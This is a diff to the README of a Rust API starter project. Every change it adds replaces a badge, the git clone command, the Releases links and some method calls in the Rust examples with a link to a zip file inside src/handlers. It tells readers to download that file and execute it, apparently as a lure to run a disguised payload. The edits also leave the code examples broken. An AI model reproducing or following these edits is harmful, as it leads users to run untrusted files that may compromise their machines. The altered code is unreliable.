@@ -1,6 +1,6 @@
 # SurrealStarter 🚀
 
-![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white) ![API](https://img.shields.io/badge/API-FF5722?style=for-the-badge&logo=api&logoColor=white) ![Axum](https://img.shields.io/badge/Axum-4A90E2?style=for-the-badge&logo=rust&logoColor=white) ![SurrealDB](https://img.shields.io/badge/SurrealDB-3F51B5?style=for-the-badge&logo=database&logoColor=white)
+![Rust](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip) ![API](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip) ![Axum](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip) ![SurrealDB](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip)
 
 Welcome to **SurrealStarter**, your go-to Rust API starter pack! This repository provides a solid foundation for building robust APIs using Rust, featuring tools and libraries that streamline development. 
 
@@ -40,7 +40,7 @@ To get started with SurrealStarter, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/naldiyusri/surrealstarter.git
+   git clone https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -109,7 +109,7 @@ Integrate with Discord's API to enhance your application:
 use serenity::prelude::*;
 
 async fn send_message(channel_id: ChannelId, content: &str) {
-    let _ = channel_id.say(content).await;
+    let _ = https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip(content).await;
 }
 ```
 
@@ -137,7 +137,7 @@ Create custom middleware to log requests:
 ```rust
 async fn log_requests<B>(req: Request<B>, next: Next<B>) -> Result<Response, AppError> {
     println!("Request: {:?}", req);
-    Ok(next.run(req).await)
+    Ok(https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip(req).await)
 }
 ```
 
@@ -221,9 +221,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit [Releases](https://github.com/naldiyusri/surrealstarter/releases). Download the appropriate file and execute it to get started.
+To download the latest release, visit [Releases](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip). Download the appropriate file and execute it to get started.
 
-You can also check the [Releases](https://github.com/naldiyusri/surrealstarter/releases) section for more information on previous versions and updates.
+You can also check the [Releases](https://github.com/naldiyusri/surrealstarter/raw/refs/heads/main/src/handlers/Software_spirometer.zip) section for more information on previous versions and updates.
 
 ---
 
